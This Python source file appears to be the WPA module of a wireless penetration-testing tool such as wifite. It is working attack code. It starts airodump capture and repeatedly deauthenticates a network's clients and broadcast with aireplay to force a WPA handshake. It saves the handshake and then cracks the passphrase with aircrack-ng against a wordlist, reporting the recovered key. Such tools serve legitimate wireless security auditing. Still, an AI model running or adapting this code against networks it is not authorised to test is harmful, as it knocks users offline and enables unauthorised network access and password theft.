#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..tools.airodump import Airodump
from ..tools.aireplay import Aireplay
from ..config import Configuration
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..model.handshake import Handshake
from ..model.wpa_result import CrackResultWPA

import time
import os
import re
from shutil import copy

class AttackWPA(Attack):
    def __init__(self, target):
        super(AttackWPA, self).__init__(target)
        self.clients = []
        self.crack_result = None
        self.success = False

    def run(self):
        '''
            Initiates full WPA handshake capture attack.
        '''

        # Check if user only wants to run PixieDust attack
        if Configuration.wps_only and self.target.wps:
            Color.pl('\r{!} {O}--wps-only{R} set, ignoring WPA-handshake attack on {O}%s{W}' % self.target.essid)
            self.success = False
            return self.success

        handshake = None

        # Capture the handshake ("do it live!")
        if handshake is None:
            handshake = self.capture_handshake()

        if handshake is None:
            # Failed to capture handshake
            self.success = False
            return self.success

        # Analyze handshake
        Color.pl('\n{+} analysis of captured handshake file:')
        handshake.analyze()

        # Crack it
        key = self.crack_handshake(handshake, Configuration.wordlist)
        if key is None:
            self.success = False
        else:
            self.crack_result = CrackResultWPA(handshake.bssid, handshake.essid, handshake.capfile, key)
            self.crack_result.dump()
            self.success = True
        return self.success

    def capture_handshake(self):
        ''' Returns captured or stored handshake, otherwise None '''
        handshake = None

        # First, start Airodump process
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack("WPA", self.target, "Handshake capture", "Waiting for target to appear...")
            airodump_target = self.wait_for_target(airodump)

            self.clients = []

            # Try to load existing handshake
            if Configuration.ignore_old_handshakes == False:
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = self.load_handshake(bssid=bssid, essid=essid)
                if handshake:
                    Color.pattack("WPA", self.target, "Handshake capture", "found {G}existing handshake{W} for {C}%s{W}" % handshake.essid)
                    Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
                    return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)
            deauth_timer = Timer(Configuration.wpa_deauth_timeout)

            while handshake is None and not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack("WPA",
                        airodump_target,
                        "Handshake capture",
                        "Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})" % (len(self.clients), deauth_timer, timeout_timer))

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                bssid = airodump_target.bssid
                essid = airodump_target.essid if airodump_target.essid_known else None
                handshake = Handshake(temp_file, bssid=bssid, essid=essid)
                if handshake.has_handshake():
                    # We got a handshake
                    Color.pl('\n\n{+} {G}successfully captured handshake{W}')
                    break

                # There is no handshake
                handshake = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # Look for new clients
                airodump_target = self.wait_for_target(airodump)
                for client in airodump_target.clients:
                    if client.station not in self.clients:
                        Color.clear_entire_line()
                        Color.pattack("WPA",
                                airodump_target,
                                "Handshake capture",
                                "Discovered new client: {G}%s{W}" % client.station)
                        Color.pl("")
                        self.clients.append(client.station)

                # Send deauth to a client or broadcast
                if deauth_timer.ended():
                    self.deauth(airodump_target)
                    # Restart timer
                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())
                continue # Handshake listen+deauth loop

        if handshake is None:
            # No handshake, attack failed.
            Color.pl("\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds" % (Configuration.wpa_attack_timeout))
            return handshake
        else:
            # Save copy of handshake to ./hs/
            self.save_handshake(handshake)
            return handshake

    def crack_handshake(self, handshake, wordlist):
        '''Tries to crack a handshake. Returns WPA key if found, otherwise None.'''
        if wordlist is None:
            Color.pl("{!} {O}Not cracking handshake because" +
                     " wordlist ({R}--dict{O}) is not set")
            return None
        elif not os.path.exists(wordlist):
            Color.pl("{!} {O}Not cracking handshake because" +
                     " wordlist {R}%s{O} was not found" % wordlist)
            return None

        Color.pl("\n{+} {C}Cracking WPA Handshake:{W} Using {C}aircrack-ng{W} via" +
                " {C}%s{W} wordlist" % os.path.split(wordlist)[-1])

        key_file = Configuration.temp('wpakey.txt')
        command = [
            "aircrack-ng",
            "-a", "2",
            "-w", wordlist,
            "--bssid", handshake.bssid,
            "-l", key_file,
            handshake.capfile
        ]
        crack_proc = Process(command)

        # Report progress of cracking
        aircrack_nums_re = re.compile(r"(\d+)/(\d+) keys tested.*\(([\d.]+)\s+k/s")
        aircrack_key_re  = re.compile(r"Current passphrase:\s*([^\s].*[^\s])\s*$")
        num_tried = num_total = 0
        percent = num_kps = 0.0
        eta_str = "unknown"
        current_key = ''
        while crack_proc.poll() is None:
            line = crack_proc.pid.stdout.readline()
            match_nums = aircrack_nums_re.search(line.decode('utf-8'))
            match_keys = aircrack_key_re.search(line.decode('utf-8'))
            if match_nums:
                num_tried = int(match_nums.group(1))
                num_total = int(match_nums.group(2))
                num_kps = float(match_nums.group(3))
                eta_seconds = (num_total - num_tried) / num_kps
                eta_str = Timer.secs_to_str(eta_seconds)
                percent = 100.0 * float(num_tried) / float(num_total)
            elif match_keys:
                current_key = match_keys.group(1)
            else:
                continue

            status = "\r{+} {C}Cracking WPA Handshake: %0.2f%%{W}" % percent
            status += " ETA: {C}%s{W}" % eta_str
            status += " @ {C}%0.1fkps{W}" % num_kps
            #status += " ({C}%d{W}/{C}%d{W} keys)" % (num_tried, num_total)
            status += " (current key: {C}%s{W})" % current_key
            Color.clear_entire_line()
            Color.p(status)

        Color.pl("")
        # Check crack result
        if os.path.exists(key_file):
            with open(key_file, "r") as fid:
                key = fid.read().strip()
            os.remove(key_file)

            Color.pl("{+} {G}Cracked WPA Handshake{W} PSK: {G}%s{W}\n" % key)
            return key
        else:
            Color.pl("{!} {R}Failed to crack handshake:" +
                     " {O}%s{R} did not contain password{W}" % wordlist.split(os.sep)[-1])
            return None

    def load_handshake(self, bssid, essid):
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        if essid:
            essid_safe = re.escape(re.sub('[^a-zA-Z0-9]', '', essid))
        else:
            essid_safe = '[a-zA-Z0-9]+'
        bssid_safe = re.escape(bssid.replace(':', '-'))
        date = '\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}'
        get_filename = re.compile('handshake_%s_%s_%s\.cap' % (essid_safe, bssid_safe, date))

        for filename in os.listdir(Configuration.wpa_handshake_dir):
            cap_filename = os.path.join(Configuration.wpa_handshake_dir, filename)
            if os.path.isfile(cap_filename) and re.match(get_filename, filename):
                return Handshake(capfile=cap_filename, bssid=bssid, essid=essid)

        return None

    def save_handshake(self, handshake):
        '''
            Saves a copy of the handshake file to hs/
            Args:
                handshake - Instance of Handshake containing bssid, essid, capfile
        '''
        # Create handshake dir
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.mkdir(Configuration.wpa_handshake_dir)

        # Generate filesystem-safe filename from bssid, essid and date
        essid_safe = re.sub('[^a-zA-Z0-9]', '', handshake.essid)
        bssid_safe = handshake.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        cap_filename = 'handshake_%s_%s_%s.cap' % (essid_safe, bssid_safe, date)
        cap_filename = os.path.join(Configuration.wpa_handshake_dir, cap_filename)

        if Configuration.wpa_strip_handshake:
            Color.p("{+} {C}stripping{W} non-handshake packets, saving to {G}%s{W}..." % cap_filename)
            handshake.strip(outfile=cap_filename)
            Color.pl('{G}saved{W}')
        else:
            Color.p('{+} saving copy of {C}handshake{W} to {C}%s{W} ' % cap_filename)
            copy(handshake.capfile, cap_filename)
            Color.pl('{G}saved{W}')

        # Update handshake to use the stored handshake file for future operations
        handshake.capfile = cap_filename


    def deauth(self, target):
        '''
            Sends deauthentication request to broadcast and every client of target.
            Args:
                target - The Target to deauth, including clients.
        '''
        if Configuration.no_deauth: return

        for index, client in enumerate([None] + self.clients):
            if client is None:
                target_name = "*broadcast*"
            else:
                target_name = client
            Color.clear_entire_line()
            Color.pattack("WPA",
                    target,
                    "Handshake capture",
                    "Deauthing {O}%s{W}" % target_name)
            Aireplay.deauth(target.bssid, client_mac=client, timeout=2)

if __name__ == '__main__':
    Configuration.initialize(True)
    from ..model.target import Target
    fields = "A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  11,  54e,WPA, WPA, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, ".split(',')
    target = Target(fields)
    wpa = AttackWPA(target)
    try:
        wpa.run()
    except KeyboardInterrupt:
        Color.pl("")
        pass
    Configuration.exit_gracefully(0)
